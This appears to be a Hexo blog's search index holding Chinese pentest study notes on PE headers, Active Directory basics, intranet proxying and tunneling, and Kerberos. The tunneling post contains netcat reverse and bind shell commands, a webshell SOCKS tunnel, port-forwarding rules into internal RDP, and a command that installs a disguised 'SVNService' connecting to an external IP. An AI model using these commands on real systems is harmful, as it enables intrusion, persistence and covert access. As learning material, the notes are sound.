class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IMAGE_SECTION_HEADER</span> &#123;  <br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];                        <span class="hljs-comment">//8个字节的块名  </span><br>    <span class="hljs-keyword">union</span>                         <br>    &#123;  <br>        DWORD PhysicalAddress;  <span class="hljs-comment">//该 Section 的物理地址</span><br>        DWORD VirtualSize;  <span class="hljs-comment">//该 Section 加载到内存中时的真实大小。</span><br>    &#125; Misc;                     <span class="hljs-comment">//区块尺寸</span><br>    <br>    DWORD VirtualAddress;       <span class="hljs-comment">//区块的起始RVA地址  </span><br>    DWORD SizeOfRawData;        <span class="hljs-comment">//在磁盘上占用的空间大小（对齐）  该值必须是 FileAlignment 值的整数倍。</span><br>    DWORD PointerToRawData;     <span class="hljs-comment">//在文件中偏移  </span><br>    DWORD PointerToRelocations; <span class="hljs-comment">//在OBJ文件中使用，重定位开头的文件指针。 </span><br>    DWORD PointerToLinenumbers; <span class="hljs-comment">//行号表的偏移（供调试使用地）  </span><br>    WORD NumberOfRelocations;   <span class="hljs-comment">//在OBJ文件中使用，重定位项数目  </span><br>    WORD NumberOfLinenumbers;   <span class="hljs-comment">//行号表中行号的数目  </span><br>    DWORD Characteristics;      <span class="hljs-comment">//区块属性如可执行、可读、可写、初始化数据、未初始化数据等 </span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; <br></code></pre></td></tr></table></figure><p>节名称:</p><p><img src="/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/1993669-20210817234817787-1631854918.png" alt="img"></p><img src="/2022/06/12/PE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/1993669-20210817234817787-1631854918.png" class="" title="节名称"><blockquote><p>参考链接:</p><p><a href="https://www.freebuf.com/articles/system/288382.html">PE文件结构解析</a></p><p><a href="http://t.zoukankan.com/Leo_wl-p-3335894.html">DOS头分析</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Windows </tag>
            
            <tag> 免杀-二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-内网基础知识</title>
      <link href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-内网概述"><a href="#1-内网概述" class="headerlink" title="1. 内网概述"></a>1. 内网概述</h2><p>内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。</p><span id="more"></span><p>内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、网吧、单位办公网等都属于此类。</p><h2 id="2-工作组"><a href="#2-工作组" class="headerlink" title="2. 工作组"></a>2. 工作组</h2><p> 大型网络中，可能会有成百上千台计算机组成局域网，所以为了便于管理，将其进行分组，所以有了工作组的概念。将不同的计算机按功能分别列入不同的工作组。</p><h3 id="如何加入、创建工作组？"><a href="#如何加入、创建工作组？" class="headerlink" title="如何加入、创建工作组？"></a>如何加入、创建工作组？</h3><p>右击桌面“计算机”，点击“属性”，“更改设置”，“更改”，在“计算机名”一栏中输入工作组名称。<br>win10也可以在设置中搜索工作组</p><h3 id="如何退出工作组？"><a href="#如何退出工作组？" class="headerlink" title="如何退出工作组？"></a>如何退出工作组？</h3><p>只要将工作组名改动即可，也可以随便加入同一网络上的任何其他工作组。类似于一个社团一样，想进就进，想退出就退出。<br>工作组里的所有计算机都是对等的，没有服务器和客户机之分。</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631196710523_47415892973.png" alt="图片描述"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631196710523_47415892973.png" class="" title="工作组"><p> 如果输入的工作组不存在，那么相当于新建了一个工作组（当然，只有当前计算机在此工作组中）。</p><p> 工作组就像一个可以自由进入和退出的社团，方便同组的计算机互相访问。工作组没有集中管理作用，工作组里的所有计算机都是对等的。（没有服务器和客户机之分）</p><h2 id="3-域"><a href="#3-域" class="headerlink" title="3. 域"></a>3. 域</h2><p> 计算机域(Domain)是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可。（安全边界是指：在两个域中，一个域中的用户无法访问另外一个域中的资源。）域可以简单理解为升级版的工作组。但是与工作组相比，域有更严格的安全管理控制机制。用户想要访问域内的资源。必须以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。</p><p> 域控制器（Domain Controller）是域中的一台类似管理服务器的计算机</p><p> 域中所有计算机想要互相访问，都要经过域控制器的审核。</p><p> DC中存在由这个域的账号，密码，属于这个域的计算机等信息构成的数据库。当计算机连接到域的时候，域控制器首先要鉴别这台计算机是否属于这个域，以及用户使用的登录账号是否存在，密码是否正确。</p><p> 控制器是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行，也就是说，域内所有用来验证身份的账号和密码列值都保存在域控制器中。</p><h3 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h3><p> 域中一般有如下的几个环境。</p><p> 1.单域</p><p> 2.父域和子域</p><p> 3.域树</p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>单域包括主域管理器和任意数量的计算机。单域网络比较适合于位置和业务功能较少的公司。网络中的所有通信都通过主域管理器路由。<br>在一般的具有固定地理位置的小公司里，建立一个域就可满足所需。<br>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，而有一台备份域控制器（BDC），则至少该域还能正常使用。</p><h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>如果在网络中划分多个域，那么第一个域为父域，每个部分的域为子域。域树中父域与子域可以互相管理，跨网络分配文件和打印机等等。<br>出于管理及其他一些需求，需要在网络中划分多个域，第一个域成为父域，各分部的域称为子域。所以父域是相对而言的。</p><p>如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构，<br>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互所花费的时间会比较长，而且占用的带宽也比较大。</p><h3 id="域树（tree）"><a href="#域树（tree）" class="headerlink" title="域树（tree）"></a>域树（tree）</h3><p>如果一个域是另一个域的子域,那么这两个域可以组成一个域树。域树由多个域组成，树中的域通过信任关系连接起来。一个管理员只能管理本域，不能访问和管理其它域。通过建立信任关系可以相互访问。域树中的父域和子域间自动建立一种双向可传递的信任关系。</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631202873545_696808272961.png" alt="图片描述"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631202873545_696808272961.png" class="" title="域树"><h3 id="域森林（forest）"><a href="#域森林（forest）" class="headerlink" title="域森林（forest）"></a>域森林（forest）</h3><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631202857682_416552709519.png" alt="图片描述"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631202857682_416552709519.png" class="" title="域森林"><h3 id="4-域名服务器（DNS）"><a href="#4-域名服务器（DNS）" class="headerlink" title="4.域名服务器（DNS）"></a>4.域名服务器（DNS）</h3><p> 域名服务器（Domain Name Server,DNS）</p><p> 用于实现域名和与之相对应的IP地址转换的服务器。</p><p> 域树中的域名和DNS域名非常相似。实际上，因为域中的计算机是使用DNS来定位域控制器、服务器及其计算机、网络服务的，所以域的名字就是DNS域的名字。</p><p>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><h2 id="5-活动目录（Active-Directory）-简称AD"><a href="#5-活动目录（Active-Directory）-简称AD" class="headerlink" title="5. 活动目录（Active Directory） 简称AD"></a>5. 活动目录（Active Directory） 简称AD</h2><p>活动目录是域环境中提供目录服务的组件。</p><p>**目录是什么？**目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。<br></code></pre></td></tr></table></figure><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中，由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。</p><p>活动目录的逻辑结构就包括组织单元（OU）、域、域树、域森林。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p><h3 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h3><p>1.账号集中管理，所有账号均存在服务器上，方便对账号的管理。<br>2.软件集中管理，统一推送软件。<br>3.环境集中管理，利用AD可以统一客户端桌面，IE,TCP&#x2F;IP等设置。<br>4.增强安全性，统一部署杀毒软件和扫毒任务。<br>5.更可靠，更少的宕机时间。</p><h2 id="6-域控制器-DC-和活动目录-AD-的区别"><a href="#6-域控制器-DC-和活动目录-AD-的区别" class="headerlink" title="6. 域控制器(DC)和活动目录(AD)的区别"></a>6. 域控制器(DC)和活动目录(AD)的区别</h2><p>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</p><p>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就成为DC。所以我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">例子：在这<span class="hljs-number">200</span>台计算机各自的SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须进行<span class="hljs-number">200</span>次更改…..<br><br> 那么如果在域环境中，一台计算机安装了AD，它就变成了DC。那么只需在活动目录中创建或修改一次Alan账户一次，就可以在<span class="hljs-number">200</span>台计算机创建Alan账户或者更改Alan的密码。<br></code></pre></td></tr></table></figure><h2 id="7-安全域的划分"><a href="#7-安全域的划分" class="headerlink" title="7. 安全域的划分"></a>7. 安全域的划分</h2><p> 划分安全域的目的是将一组安全等级相同的计算机划入同一网段。这个网段的计算机拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL）</p><p><code>![图片描述](内网渗透-内网基础知识/image-1631203392575_174100932295.png)</code></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-1631203392575_174100932295.png" class="" width="4"><p> 一个典型的中小型内网安全域划分如上图</p><p> DMZ(隔离区)，是为了解决安装防火墙后外部网络无法访问内网服务器的问题而设立的一个非安全系统和安全系统之间的缓冲区。</p><h2 id="8-域中的计算机的分类"><a href="#8-域中的计算机的分类" class="headerlink" title="8. 域中的计算机的分类"></a>8. 域中的计算机的分类</h2><p> 域结构中的计算机的身份是不对等的，有域控制器（DC），成员服务器，客户机，独立服务器。</p><h2 id="9-域内权限解读"><a href="#9-域内权限解读" class="headerlink" title="9. 域内权限解读"></a>9. 域内权限解读</h2><p> 组（Group）是用户账号的集合。通过向一组用户分配权限，就可以不必向每一个用户分别分配权限。</p><h3 id="1-域本地组"><a href="#1-域本地组" class="headerlink" title="1. 域本地组"></a>1. 域本地组</h3><p> 主要用于授予本域内资源的访问权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">几个重要的域本地组权限：<br>    管理员组（Administrators）<br>    远程登录组（Remote Desktop Users）<br>    打印操作员组（<span class="hljs-built_in">Print</span> Operators）<br>    账号操作员组（Account Operators）<br>    服务器操作员组（Server Operators）<br>    备份操作员组（Backup Operators）<br></code></pre></td></tr></table></figure><h3 id="2-全局组"><a href="#2-全局组" class="headerlink" title="2. 全局组"></a>2. 全局组</h3><p> 可以全局使用。即：可在本域和有信任关系的其它域中使用，体现的是全局性。MS建议的规则：基于组 织结构、行政结构规划。</p><h3 id="3-通用组"><a href="#3-通用组" class="headerlink" title="3. 通用组"></a>3. 通用组</h3><p> 组的成员情况，记录在全局目录GC中，非常适于林中跨域访问使用。集成了全局组和域本地组的长处</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade">几个重要的全局组，通用组的权限：<br>    域管理员组（<span class="hljs-built_in">Domain</span> Admins）<br>    企业系统管理员组（Enterprise Admins）<br>    架构管理员组（<span class="hljs-built_in">Schema</span> Admins）<br>    域用户组（<span class="hljs-built_in">Domain</span> Users）<br></code></pre></td></tr></table></figure><p>域本地组来自全林，作用于本域；全局组来自本域作用于全林；通用组来自全林，作用于全林。</p><h3 id="4-A-G-DL-P策略"><a href="#4-A-G-DL-P策略" class="headerlink" title="4. A-G-DL-P策略"></a>4. A-G-DL-P策略</h3><p> 将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p> A 用户账号（Account）</p><p> G 全局组（Global Group）</p><p> U 通用组（Universal Group）</p><p> DL 本地域组（Domain Local Group）</p><p> P 许可（Permission）</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> 内网信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-内网代理转发与隧道隐藏</title>
      <link href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/"/>
      <url>/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>当你内网横向中,内网代理转发和隧道隐藏技术非常重要. 当拿下内网一台主机的控制权后，需要通过代理转发的方式进入内网.当目标有防火墙时,隧道隐藏技术可以帮助我们达到绕过防火墙的目的.</p><h1 id="0x01-正反向代理和正反向shell"><a href="#0x01-正反向代理和正反向shell" class="headerlink" title="0x01 正反向代理和正反向shell"></a>0x01 正反向代理和正反向shell</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>构造代理服务器，用户将请求发送到代理服务器，代理服务器将请求发送到服务器，服务器将信息发送到代理服务器，代理服务器再将信息发送到用户。</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png" alt="图片.png"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291888961-bf8c2cba-0e8b-49ea-a842-7e3645b27e8b.png" class="" title="正向代理"><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>用户将请求发送到反向代理服务器，反向代理服务器将请求发送到服务器，服务器将信息发送到反向代理服务器，返现代理服务器将信息发送用户，常见应用场景为企业网访问互联网。</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png" alt="img"></p><img src="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91%E4%B8%8E%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/1637291909331-8d34af6a-1db9-4cee-b8ca-dbc10311d926.png" class="" title="反向代理"><h2 id="正向-反向shell"><a href="#正向-反向shell" class="headerlink" title="正向&amp;反向shell"></a>正向&amp;反向shell</h2><p>客户端链接服务器：</p><p>服务器 nc -lvnp 444</p><p>客户端 nc 服务器ip 444</p><ul><li><p>如果服务器想获取客户端的shell 反向shell</p><ul><li>服务器：<code>nc -lvp 4444</code></li><li>客户端：<code>nc 服务端ip 4444 -e /bin/bash </code></li></ul></li><li><p>如果客户端想获取服务器的shell 正向shell</p><ul><li>服务器：<code>nc -lvp 4444 -e /bin/bash</code></li><li>客户端：<code>nc 服务器ip 4444</code></li></ul></li></ul><h1 id="0x02-socks协议"><a href="#0x02-socks协议" class="headerlink" title="0x02 socks协议"></a>0x02 socks协议</h1><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。Socks介于传输层与表示层之间，使用TCP协议传输。</p><h2 id="常用socks代理工具"><a href="#常用socks代理工具" class="headerlink" title="常用socks代理工具"></a>常用socks代理工具</h2><ul><li>EarthWorm</li><li>regGeorg</li><li>sSocks</li><li>SocksCap64</li><li>Proxifier</li><li>ProxyChains</li></ul><h1 id="0x03-隧道相关"><a href="#0x03-隧道相关" class="headerlink" title="0x03 隧道相关"></a>0x03 隧道相关</h1><p>隧道技术是一种通过使用互联网络的基本设施在网络之间传递数据的方式，使用隧道传递的数据（或负载）可以是<strong>不同协议的数据帧或包</strong>。隧道技术将其他协议的数据帧或者数据包重新封装然后通过<strong>隧道</strong>发送。新的帧头提供路由信息，以便互联网传递被封装的负载数据。</p><h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立tcp连接，然后进行正常的数据通信。在指定ip地址的情况下，可以直接发送报文；如果不知道ip地址，就需要将域名解析成ip地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙</p><p>常用的隧道列举如下。</p><p>网络层：Ipv6情况、icmp情况、Gre隧道0</p><p>传输层： Tcp 隧道、udp 隧道 常规端口转发 ·</p><p>应用层： ssh隧道、http隧道、https隧道、dns隧道</p><p>具体的利用以后用到再详细写</p><h1 id="0x04-内网代理转发常用方法和工具"><a href="#0x04-内网代理转发常用方法和工具" class="headerlink" title="0x04 内网代理转发常用方法和工具"></a>0x04 内网代理转发常用方法和工具</h1><h2 id="msf-建立路由开启socks代理"><a href="#msf-建立路由开启socks代理" class="headerlink" title="msf 建立路由开启socks代理"></a>msf 建立路由开启socks代理</h2><p>当服务器通外网时,我们获得了一个msf的session 可以通过msf自带的 autoroute 来建立一个基于session的路由,当建立以后.msf内的工具可以直接与内网通信.如果要其他工具也使用的话 msf建立一个socks代理服务即可</p><h2 id="Neo-reGeorg-端口复用"><a href="#Neo-reGeorg-端口复用" class="headerlink" title="Neo-reGeorg 端口复用"></a>Neo-reGeorg 端口复用</h2><p>配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。</p><p><a href="https://github.com/L-codes/Neo-reGeorg">https://github.com/L-codes/Neo-reGeorg</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 neoreg.py generate -k password<span class="hljs-comment">#生成服务端</span><br>python3 neoreg.py -k password -u http://xx/tunnel.php<span class="hljs-comment">#在本地建立Socks5代理</span><br></code></pre></td></tr></table></figure><h2 id="Windows-netsh-端口转发（双网卡用）"><a href="#Windows-netsh-端口转发（双网卡用）" class="headerlink" title="Windows netsh 端口转发（双网卡用）"></a>Windows netsh 端口转发（双网卡用）</h2><p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><p>连接外网6666端口，就是连接到内网目标上面的3389。</p><p><strong>启动转发</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看现有规则</span><br>netsh interface portproxy show all<br><br><span class="hljs-comment">#添加转发规则</span><br>netsh interface portproxy <span class="hljs-built_in">set</span> v4tov4 listenaddress=外网IP listenport=6666 connectaddress=内网IP connectport=3389<br></code></pre></td></tr></table></figure><p><strong>取消转发</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#删除转发规则</span><br>netsh interface portproxy delete v4tov4 listenport=6666<br><br><span class="hljs-comment">#xp需要安装ipv6</span><br>netsh interface ipv6 install<br></code></pre></td></tr></table></figure><h2 id="Linux-iptables-端口转发（高权限用）"><a href="#Linux-iptables-端口转发（高权限用）" class="headerlink" title="Linux iptables 端口转发（高权限用）"></a>Linux iptables 端口转发（高权限用）</h2><p>1、编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/sysctl.conf<br>net.ipv4.ip_forward = 1#开启IP转发<br></code></pre></td></tr></table></figure><p>2、关闭服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service iptables stop<br></code></pre></td></tr></table></figure><p>3、配置规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#需要访问的内网地址：10.1.1.11（Windows）</span><br><span class="hljs-comment">#内网边界web服务器：192.168.100.100（Linux）</span><br>iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389<br><br>iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100<br></code></pre></td></tr></table></figure><p>4、保存并重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">service iptables save &amp;&amp; service iptables start<br></code></pre></td></tr></table></figure><p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p><h2 id="nps反向代理"><a href="#nps反向代理" class="headerlink" title="nps反向代理"></a>nps反向代理</h2><p>1、下载nps服务端到自己的VPS（以Linux-Centos为例）<a href="https://ehang-io.github.io/nps">https://ehang-io.github.io/nps</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ./nps install<span class="hljs-comment">#安装</span><br><span class="hljs-built_in">sudo</span> nps start<span class="hljs-comment">#启动</span><br><span class="hljs-built_in">sudo</span> nps stop<span class="hljs-comment">#停止</span><br><span class="hljs-built_in">sudo</span> nps reload<span class="hljs-comment">#服务端配置文件重载</span><br></code></pre></td></tr></table></figure><p>2、修改配置文件（敏感信息改掉） <code>/etc/nps/conf/nps.conf</code></p><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>web_port</td><td>web管理端口</td></tr><tr><td>web_password</td><td>web界面管理密码</td></tr><tr><td>web_username</td><td>web界面管理账号</td></tr><tr><td>auth_key</td><td>web api密钥</td></tr><tr><td>public_vkey</td><td>客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</td></tr><tr><td>auth_crypt_key</td><td>获取服务端authKey时的aes加密密钥，16位</td></tr></tbody></table><p><strong>创建系统服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc create svnservice binpath= <span class="hljs-string">&quot;C:\Users\Public\Videos\setup.exe -server=111.173.114.77:8091 -vkey=zkxcn35bhkzit2kt -type=tcp&quot;</span>  displayname= <span class="hljs-string">&quot;SVNService&quot;</span> depend= Tcpip start= auto<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc start svnservice<br></code></pre></td></tr></table></figure><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 内网代理转发 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-域渗透</title>
      <link href="/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
      <url>/2022/05/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>域渗透需要知道的知识在这一部分,主要了解<code>kerberos</code>协议,黄金&#x2F;白银票据等知识</p><span id="more"></span><p>学习域渗透，绕不开对kerberos协议的学习。</p><h1 id="0x01-Kerberos协议"><a href="#0x01-Kerberos协议" class="headerlink" title="0x01 Kerberos协议"></a>0x01 Kerberos协议</h1><p><code>Kerberos </code>是一种网络认证协议，其设计目标是通过密钥系统为客户机 &#x2F; 服务器应用程序提供强大的认证服务。</p><h2 id="协议的三个主要角色"><a href="#协议的三个主要角色" class="headerlink" title="协议的三个主要角色"></a>协议的三个主要角色</h2><ul><li>客户端（Client）：发送请求的一方</li><li>服务端（Server）：接收请求的一方</li><li>密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：<ul><li>AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据&#x2F;Ticket Granting Ticket）</li><li>TGS（Ticket Granting Server）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的ST(服务授予票据 Server Ticket)</li></ul></li></ul><h2 id="协议过程分析"><a href="#协议过程分析" class="headerlink" title="协议过程分析"></a>协议过程分析</h2><h3 id="简易的认证过程"><a href="#简易的认证过程" class="headerlink" title="简易的认证过程"></a>简易的认证过程</h3><p>如图所示就是基本的认证过程</p><p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F/1595488751709-c9690fe7-9aa1-496e-a887-bcda39fba3c3.png" alt="img"></p><img 